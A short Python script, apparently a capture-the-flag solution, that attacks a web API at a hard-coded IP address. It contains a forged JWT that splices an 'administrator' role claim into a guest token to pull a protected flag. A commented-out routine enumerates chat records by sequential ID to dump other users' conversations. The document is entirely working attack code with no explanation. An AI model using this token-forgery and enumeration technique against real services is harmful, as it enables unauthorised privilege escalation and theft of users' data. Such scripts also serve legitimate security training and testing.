import requests
import json
from time import sleep
url = "http://94.237.60.112:42136/"
urlgen = "http://94.237.60.112:42136//api/v1/get_ticket"
urlchat = "http://94.237.60.112:42136/api/v1/chat/"
urlflag = "http://94.237.60.112:42136/api//v1/flag"
token1 = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzMzQ2MzEsImlhdCI6MTcxMDMzMTAzMSwianRpIjoiWjh4V1NCMlZsWFhPQUJveEZzXzR4QSIsIm5iZiI6MTcxMDMzMTAzMSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9eyJleHAiOjE3MTAzMzQ2MzEsImlhdCI6MTcxMDMzMTAzMSwianRpIjoiWjh4V1NCMlZsWFhPQUJveEZzXzR4QSIsIm5iZiI6MTcxMDMzMTAzMSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQy88H5_3SzBKB8n4fVMJX0NMa51U4tPUtRTT3AFkfVNf51z-wH_YBepHDdAf0rFxdWM_iBYUtYHZhMvdhP-rWRSRtwgFS4mXn4ffm7PrEM78Tev9Pbc8Qr1K-Un9iFJe92H2wim1RKGuPFApQpRjxPt231coej4GXsnNJ1OaJmE-fSlUlaHAdvwDJ5RZWx4MwPJyBPUuP9-yqBIGe8TrnlFPTbbHKm_gdPXYwcRFUoownDMfLO59259j8LGHpm09vehbglKG7BUIhvM6-QFDjDciiWXIWgRWXgEo4fqMrsMGpQwS24AYTbFDfg_aPY2qME0Bs2vFC_J-FFMuN51IZMA"
chats = {}
def get_ticket():
    r = requests.get(urlgen)
    ticket = json.loads(r.text).get("ticket: ")
    print(ticket)
    return ticket

def dump_chats(ticket):
    HEADERS = {
        "Authorization": ticket
    }
    for i in range(1,11):
        r = requests.get(f'{urlchat}{i}', headers=HEADERS)
        chat = json.loads(r.text)
        chats.update(chat)
        if r.status_code == 200:
            print(r.text)
def get_flag(ticket):
    HEADERS = {
        "Authorization": token1
    }
    r = requests.get(urlflag, headers=HEADERS)
    print(r.status_code)
    print(r.text)

def keep_alive():
    while True:
        r = requests.get(url)
        print(r.status_code)
        sleep(5)
def main():
    ticket = get_ticket()
    #dump_chats(ticket)
    get_flag(ticket)

#keep_alive()
main()
#print(json.dump(chats))
